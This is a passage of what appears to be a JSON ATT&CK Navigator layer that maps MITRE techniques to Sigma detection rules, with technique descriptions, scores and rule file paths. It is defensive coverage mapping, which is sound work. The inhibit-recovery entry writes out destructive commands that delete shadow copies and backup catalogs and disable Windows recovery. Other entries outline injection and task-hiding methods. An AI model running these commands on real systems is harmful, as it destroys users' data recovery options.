                    "value": "sigma\\rules-emerging-threats\\2017\\Malware\\NotPetya\\proc_creation_win_malware_notpetya.yml"
                },
                {
                    "name": "proc_creation_win_apt_sofacy.yml",
                    "value": "sigma\\rules-emerging-threats\\2018\\TA\\APT28\\proc_creation_win_apt_sofacy.yml"
                },
                {
                    "name": "file_event_win_apt_cozy_bear_phishing_campaign_indicators.yml",
                    "value": "sigma\\rules-emerging-threats\\2018\\TA\\APT29-CozyBear\\file_event_win_apt_cozy_bear_phishing_campaign_indicators.yml"
                },
                {
                    "name": "proc_creation_win_apt_apt29_phishing_campaign_indicators.yml",
                    "value": "sigma\\rules-emerging-threats\\2018\\TA\\APT29-CozyBear\\proc_creation_win_apt_apt29_phishing_campaign_indicators.yml"
                },
                {
                    "name": "proc_creation_win_apt_equationgroup_dll_u_load.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\TA\\EquationGroup\\proc_creation_win_apt_equationgroup_dll_u_load.yml"
                },
                {
                    "name": "proc_creation_win_malware_emotet_rundll32_execution.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\Malware\\Emotet\\proc_creation_win_malware_emotet_rundll32_execution.yml"
                },
                {
                    "name": "proc_creation_win_apt_evilnum_jul20.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\TA\\Evilnum\\proc_creation_win_apt_evilnum_jul20.yml"
                },
                {
                    "name": "create_remote_thread_win_malware_bumblebee.yml",
                    "value": "sigma\\rules-emerging-threats\\2022\\Malware\\Bumblebee\\create_remote_thread_win_malware_bumblebee.yml"
                },
                {
                    "name": "proc_creation_win_malware_icedid_rundll32_dllregisterserver.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Malware\\IcedID\\proc_creation_win_malware_icedid_rundll32_dllregisterserver.yml"
                },
                {
                    "name": "proc_creation_win_malware_rhadamanthys_stealer_dll_launch.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Malware\\Rhadamanthys\\proc_creation_win_malware_rhadamanthys_stealer_dll_launch.yml"
                }
            ]
        },
        {
            "techniqueID": "T1546",
            "score": 3,
            "comment": "Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.(Citation: Backdooring an AWS account)(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft DART Case Report 001)\n\nAdversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.(Citation: FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)\n\nSince the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges. ",
            "metadata": [
                {
                    "name": "proc_creation_win_apt_hafnium.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\TA\\HAFNIUM\\proc_creation_win_apt_hafnium.yml"
                },
                {
                    "name": "proc_creation_win_apt_sourgrum.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\TA\\SOURGUM\\proc_creation_win_apt_sourgrum.yml"
                },
                {
                    "name": "win_mssql_sp_maggie.yml",
                    "value": "sigma\\rules-emerging-threats\\2022\\Malware\\win_mssql_sp_maggie.yml"
                }
            ]
        },
        {
            "techniqueID": "T1543.003",
            "score": 7,
            "comment": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002). To make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component).",
            "metadata": [
                {
                    "name": "win_system_apt_stonedrill.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\Malware\\StoneDrill\\win_system_apt_stonedrill.yml"
                },
                {
                    "name": "win_system_apt_carbonpaper_turla.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\TA\\Turla\\win_system_apt_carbonpaper_turla.yml"
                },
                {
                    "name": "win_system_apt_turla_service_png.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\TA\\Turla\\win_system_apt_turla_service_png.yml"
                },
                {
                    "name": "proc_creation_win_apt_oilrig_mar18.yml",
                    "value": "sigma\\rules-emerging-threats\\2018\\TA\\OilRig\\proc_creation_win_apt_oilrig_mar18.yml"
                },
                {
                    "name": "win_security_apt_oilrig_mar18.yml",
                    "value": "sigma\\rules-emerging-threats\\2018\\TA\\OilRig\\win_security_apt_oilrig_mar18.yml"
                },
                {
                    "name": "win_system_apt_oilrig_mar18.yml",
                    "value": "sigma\\rules-emerging-threats\\2018\\TA\\OilRig\\win_system_apt_oilrig_mar18.yml"
                },
                {
                    "name": "file_event_win_moriya_rootkit.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Malware\\Moriya-Rootkit\\file_event_win_moriya_rootkit.yml"
                }
            ]
        },
        {
            "techniqueID": "T1055.012",
            "score": 1,
            "comment": "Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  \n\nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Leitch Hollowing)(Citation: Elastic Process Injection July 2017)\n\nThis is very similar to [Thread Local Storage](https://attack.mitre.org/techniques/T1055/005) but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process. ",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_pikabot_rundll32_hollowing.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Malware\\Pikabot\\proc_creation_win_malware_pikabot_rundll32_hollowing.yml"
                }
            ]
        },
        {
            "techniqueID": "T1055.001",
            "score": 2,
            "comment": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) \n\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. ",
            "metadata": [
                {
                    "name": "proc_creation_win_apt_taidoor.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\TA\\TAIDOOR-RAT\\proc_creation_win_apt_taidoor.yml"
                },
                {
                    "name": "create_remote_thread_win_loadlibrary.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\create_remote_thread\\create_remote_thread_win_loadlibrary.yml"
                }
            ]
        },
        {
            "techniqueID": "T1505.003",
            "score": 7,
            "comment": "Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.(Citation: volexity_0day_sophos_FW)\n\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. [China Chopper](https://attack.mitre.org/software/S0020) Web shell client).(Citation: Lee 2013)",
            "metadata": [
                {
                    "name": "web_cve_2014_6287_hfs_rce.yml",
                    "value": "sigma\\rules-emerging-threats\\2014\\Exploits\\CVE-2014-6287\\web_cve_2014_6287_hfs_rce.yml"
                },
                {
                    "name": "web_cve_2018_2894_weblogic_exploit.yml",
                    "value": "sigma\\rules-emerging-threats\\2018\\Exploits\\CVE-2018-2894\\web_cve_2018_2894_weblogic_exploit.yml"
                },
                {
                    "name": "web_solarwinds_supernova_webshell.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\TA\\SolarWinds-Supply-Chain\\web_solarwinds_supernova_webshell.yml"
                },
                {
                    "name": "web_cve_2021_40539_manageengine_adselfservice_exploit.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-40539\\web_cve_2021_40539_manageengine_adselfservice_exploit.yml"
                },
                {
                    "name": "web_unc2546_dewmode_php_webshell.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\TA\\UNC2546\\web_unc2546_dewmode_php_webshell.yml"
                },
                {
                    "name": "web_cve_2023_34362_known_payload_request.yml.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Exploits\\CVE-2023-34362-MOVEit-Transfer-Exploit\\web_cve_2023_34362_known_payload_request.yml.yml"
                },
                {
                    "name": "proc_creation_win_susp_execution_path_webserver.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_susp_execution_path_webserver.yml"
                }
            ]
        },
        {
            "techniqueID": "T1505.001",
            "score": 1,
            "comment": "Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).\n\nAdversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019) To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019)(Citation: Microsoft xp_cmdshell 2017) \n\nMicrosoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.).(Citation: Microsoft CLR Integration 2017) Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.(Citation: NetSPI SQL Server CLR) ",
            "metadata": [
                {
                    "name": "file_event_win_cve_2023_27363_foxit_rce.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Exploits\\CVE-2023-27363\\file_event_win_cve_2023_27363_foxit_rce.yml"
                }
            ]
        },
        {
            "techniqueID": "T1053.005",
            "score": 13,
            "comment": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated [at](https://attack.mitre.org/software/S0110) utility could also be abused by adversaries (ex: [At](https://attack.mitre.org/techniques/T1053/002)), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments) ",
            "metadata": [
                {
                    "name": "proc_creation_win_apt_turla_comrat_may20.yml",
                    "value": "sigma\\rules-emerging-threats\\2014\\TA\\Turla\\proc_creation_win_apt_turla_comrat_may20.yml"
                },
                {
                    "name": "proc_creation_win_apt_oilrig_mar18.yml",
                    "value": "sigma\\rules-emerging-threats\\2018\\TA\\OilRig\\proc_creation_win_apt_oilrig_mar18.yml"
                },
                {
                    "name": "win_security_apt_oilrig_mar18.yml",
                    "value": "sigma\\rules-emerging-threats\\2018\\TA\\OilRig\\win_security_apt_oilrig_mar18.yml"
                },
                {
                    "name": "win_system_apt_oilrig_mar18.yml",
                    "value": "sigma\\rules-emerging-threats\\2018\\TA\\OilRig\\win_system_apt_oilrig_mar18.yml"
                },
                {
                    "name": "proc_creation_win_apt_slingshot.yml",
                    "value": "sigma\\rules-emerging-threats\\2018\\TA\\Slingshot\\proc_creation_win_apt_slingshot.yml"
                },
                {
                    "name": "proc_creation_win_exploit_other_bearlpe.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\Exploits\\BearLPE-Exploit\\proc_creation_win_exploit_other_bearlpe.yml"
                },
                {
                    "name": "proc_creation_win_apt_wocao.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\TA\\Operation-Wocao\\proc_creation_win_apt_wocao.yml"
                },
                {
                    "name": "win_security_apt_wocao.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\TA\\Operation-Wocao\\win_security_apt_wocao.yml"
                },
                {
                    "name": "proc_creation_win_apt_actinium_persistence.yml",
                    "value": "sigma\\rules-emerging-threats\\2022\\TA\\ACTINIUM\\proc_creation_win_apt_actinium_persistence.yml"
                },
                {
                    "name": "win_security_apt_diamond_sleet_scheduled_task.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\TA\\Diamond-Sleet\\win_security_apt_diamond_sleet_scheduled_task.yml"
                },
                {
                    "name": "win_security_scheduled_task_deletion.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\builtin\\security\\win_security_scheduled_task_deletion.yml"
                },
                {
                    "name": "file_event_win_scheduled_task_creation.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\file\\file_event\\file_event_win_scheduled_task_creation.yml"
                },
                {
                    "name": "registry_event_scheduled_task_creation.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\registry\\registry_event\\registry_event_scheduled_task_creation.yml"
                }
            ]
        },
        {
            "techniqueID": "T1498",
            "score": 1,
            "comment": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_blackbyte_ransomware.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Malware\\BlackByte\\proc_creation_win_malware_blackbyte_ransomware.yml"
                }
            ]
        },
        {
            "techniqueID": "T1490",
            "score": 4,
            "comment": "Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) This may deny access to available backups and recovery options.\n\nOperating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Furthermore, adversaries may disable recovery notifications, then corrupt backups.(Citation: disable_notif_synology_ransom)\n\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\n\n* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>\n* [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>\n* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>\n* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>\n* <code>REAgentC.exe</code> can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system\n\nOn network devices, adversaries may leverage [Disk Wipe](https://attack.mitre.org/techniques/T1561) to delete backup firmware images and reformat the file system, then [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.\n\nAdversaries may also delete “online” backups that are connected to their network – whether via network storage media or through folders that sync to cloud services.(Citation: ZDNet Ransomware Backups 2020) In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.(Citation: Dark Reading Code Spaces Cyber Attack)(Citation: Rhino Security Labs AWS S3 Ransomware)",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_wannacry.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\Malware\\WannaCry\\proc_creation_win_malware_wannacry.yml"
                },
                {
                    "name": "proc_creation_win_malware_dtrack.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\Malware\\Dtrack-RAT\\proc_creation_win_malware_dtrack.yml"
                },
                {
                    "name": "proc_creation_win_malware_maze_ransomware.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\Malware\\Maze\\proc_creation_win_malware_maze_ransomware.yml"
                },
                {
                    "name": "image_load_dll_amsi_uncommon_process.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\image_load\\image_load_dll_amsi_uncommon_process.yml"
                }
            ]
        },
        {
            "techniqueID": "T1489",
            "score": 1,
            "comment": "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible (Citation: Novetta Blockbuster). In some cases, adversaries may stop or disable many or all services to render systems unusable.(Citation: Talos Olympic Destroyer 2018) Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) on the data stores of services like Exchange and SQL Server.(Citation: SecureWorks WannaCry Analysis)",
            "metadata": [
                {
                    "name": "proc_creation_win_taskkill_execution.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_taskkill_execution.yml"
                }
            ]
        },
        {
            "techniqueID": "T1486",
            "score": 4,
            "comment": "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018)\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529), in order to unlock and/or gain access to manipulate these files.(Citation: CarbonBlack Conti July 2020) In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017) \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017) Encryption malware may also leverage [Internal Defacement](https://attack.mitre.org/techniques/T1491/001), such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").(Citation: NHS Digital Egregor Nov 2020)\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.(Citation: Rhino S3 Ransomware Part 1)",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_wannacry.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\Malware\\WannaCry\\proc_creation_win_malware_wannacry.yml"
                },
                {
                    "name": "proc_creation_win_malware_lockergoga_ransomware.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\Malware\\LockerGoga\\proc_creation_win_malware_lockergoga_ransomware.yml"
                },
                {
                    "name": "proc_creation_win_malware_conti_ransomware_commands.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Malware\\Conti\\proc_creation_win_malware_conti_ransomware_commands.yml"
                },
                {
                    "name": "win_security_malware_bluesky_ransomware_files_indicators.yml",
                    "value": "sigma\\rules-emerging-threats\\2022\\Malware\\BlueSky-Ransomware\\win_security_malware_bluesky_ransomware_files_indicators.yml"
                }
            ]
        },
        {
            "techniqueID": "T1485",
            "score": 1,
            "comment": "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\n\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) In some cases politically oriented image files have been used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018).\n\nIn cloud environments, adversaries may leverage access to delete cloud storage, cloud storage accounts, machine images, and other infrastructure crucial to operations to damage an organization or their customers.(Citation: Data Destruction - Threat Post)(Citation: DOJ  - Cisco Insider)",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_blackbyte_ransomware.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Malware\\BlackByte\\proc_creation_win_malware_blackbyte_ransomware.yml"
                }
            ]
        },
        {
            "techniqueID": "T1219",
            "score": 1,
            "comment": "An adversary may use legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks. These services, such as `VNC`, `Team Viewer`, `AnyDesk`, `ScreenConnect`, `LogMein`, `AmmyyAdmin`, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.(Citation: Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy)\n\nRemote access software may be installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system.\n \nAdversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.\n\nInstallation of many remote access software may also include persistence (e.g., the software's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)).",
            "metadata": [
                {
                    "name": "dns_query_win_malware_socgholish_second_stage_c2.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Malware\\dns_query_win_malware_socgholish_second_stage_c2.yml"
                }
            ]
        },
        {
            "techniqueID": "T1218",
            "score": 10,
            "comment": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.\n\nSimilarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_devil_bait_output_redirect.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Malware\\Devil-Bait\\proc_creation_win_malware_devil_bait_output_redirect.yml"
                },
                {
                    "name": "proc_creation_win_malware_pikabot_combined_commands_execution.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Malware\\Pikabot\\proc_creation_win_malware_pikabot_combined_commands_execution.yml"
                },
                {
                    "name": "proc_creation_win_malware_3cx_compromise_execution.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\TA\\3CX-Supply-Chain\\proc_creation_win_malware_3cx_compromise_execution.yml"
                },
                {
                    "name": "proc_creation_win_malware_3cx_compromise_susp_children.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\TA\\3CX-Supply-Chain\\proc_creation_win_malware_3cx_compromise_susp_children.yml"
                },
                {
                    "name": "proc_creation_win_malware_3cx_compromise_susp_update.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\TA\\3CX-Supply-Chain\\proc_creation_win_malware_3cx_compromise_susp_update.yml"
                },
                {
                    "name": "proc_creation_win_diskshadow_child_process.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_diskshadow_child_process.yml"
                },
                {
                    "name": "proc_creation_win_diskshadow_script_mode.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_diskshadow_script_mode.yml"
                },
                {
                    "name": "proc_creation_win_iexpress_execution.yml",
